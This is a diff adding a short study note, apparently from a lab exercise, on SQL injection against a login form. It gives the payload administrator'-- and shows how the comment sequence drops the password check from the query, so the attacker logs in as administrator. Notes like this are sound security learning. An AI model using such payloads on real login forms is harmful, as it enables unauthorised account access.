@@ -1,0 +1,10 @@
+SQL injection - Login Functionality 
+End Goal logs in application as administrator
+
+Analysis
+__________
+payload : administrator'--
+**Natural queray**
+SELECT fristname FROM users where username='administrator' and password = 'administrator'
+**execution query**
+SELECT fristname FROM users where username='administrator'--' and password = 'administrator'
